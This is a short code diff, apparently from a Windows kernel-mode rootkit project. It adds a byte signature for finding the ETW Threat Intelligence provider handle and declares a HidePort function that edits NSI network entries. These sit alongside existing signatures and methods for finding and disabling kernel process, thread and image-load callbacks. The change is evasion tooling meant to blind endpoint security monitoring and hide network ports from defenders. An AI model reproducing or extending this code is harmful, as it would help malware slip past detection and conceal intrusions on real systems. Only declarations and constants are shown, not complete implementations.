@@ -7,9 +7,10 @@ extern "C" {
 }
 #include "MemoryUtils.hpp"
 
-constexpr UCHAR EtwThreatIntProvRegHandleSignature1[] = {0x60, 0x4C, 0x8B, 0xCC};
-constexpr UCHAR EtwThreatIntProvRegHandleSignature2[] = {0xD2, 0x48, 0x8B, 0xCC};
+constexpr UCHAR EtwThreatIntProvRegHandleSignature1[] = { 0x60, 0x4C, 0x8B, 0xCC };
+constexpr UCHAR EtwThreatIntProvRegHandleSignature2[] = { 0xD2, 0x48, 0x8B, 0xCC };
 constexpr UCHAR EtwThreatIntProvRegHandleSignature3[] = { 0x70, 0x48, 0x8B, 0xCC };
+constexpr UCHAR EtwThreatIntProvRegHandleSignature4[] = { 0x4C, 0x8B, 0x15, 0xCC };
 constexpr UCHAR PspCreateProcessNotifyRoutineSignature[] = { 0x4C, 0x8D, 0xCC };
 constexpr UCHAR PspCreateThreadNotifyRoutineSignature[] = { 0x48, 0x8D, 0xCC };
 constexpr UCHAR PspLoadImageNotifyRoutineSignature[] = { 0x48, 0x8D, 0xCC };
@@ -117,6 +118,8 @@ private:
 	NTSTATUS MatchCallback(PVOID callack, CHAR driverName[MAX_DRIVER_PATH]);
 	NTSTATUS AddDisabledCallback(DisabledKernelCallback Callback);
 	NTSTATUS RemoveDisabledCallback(KernelCallback* Callback, DisabledKernelCallback* DisabledCallback);
+	void HidePort(PVOID entries, PNSI_PARAM nsiParameter, PNSI_STATUS_ENTRY statusEntries,
+		PNSI_PROCESS_ENTRY processEntries, SIZE_T index);
 
 public:
 	void* operator new(size_t size) {
